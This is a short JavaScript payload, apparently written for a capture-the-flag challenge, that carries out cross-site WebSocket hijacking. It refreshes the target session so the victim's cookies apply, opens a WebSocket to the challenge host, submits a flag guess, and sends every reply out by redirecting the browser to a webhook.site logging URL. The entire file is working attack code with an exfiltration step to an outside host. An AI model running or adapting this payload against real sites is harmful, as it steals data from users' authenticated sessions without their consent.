(function(){
  const remote = "certle.ecsc25.hack.cert.pl";

  // Touch session so WS accepts us with victim's cookies
  fetch('https://' + remote + '/refresh').catch(()=>{});

  setTimeout(() => {
    const ws = new WebSocket('wss://' + remote + '/ws');

    ws.onopen = function(){
      // Seed guess; adjust as you iterate
      const data = { answer: "ecsc25{blablabla" };
      ws.send(JSON.stringify(data));
    };

    ws.onmessage = function(event){
      // Exfil: navigate so it shows up in your Webhook.site logs
      // We encode the data so it’s safe in the URL
      const d = typeof event.data === 'string' ? event.data : String(event.data);
      location = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?d=' + encodeURIComponent(d);
    };
  }, 1000);
})();
